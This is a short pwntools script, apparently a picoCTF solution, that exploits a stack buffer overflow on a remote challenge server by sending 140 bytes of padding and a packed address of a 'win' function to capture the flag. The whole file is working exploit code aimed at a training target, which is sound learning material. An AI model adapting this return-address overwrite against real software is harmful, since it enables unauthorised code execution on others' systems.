#!/usr/bin/python3
from pwn import *


gs = '''
continue
'''
def start():
    return remote("saturn.picoctf.net", 53505)

io = start()

offset = b"A"*136 + b"B"*4
win_addr = 0x00401530

payload = offset + p32(win_addr)

io.recvuntil(b"Give me a string!")
io.sendline(payload)

# Do not go interactive as this will not give you the flag
print(io.recv())
print(io.recv())
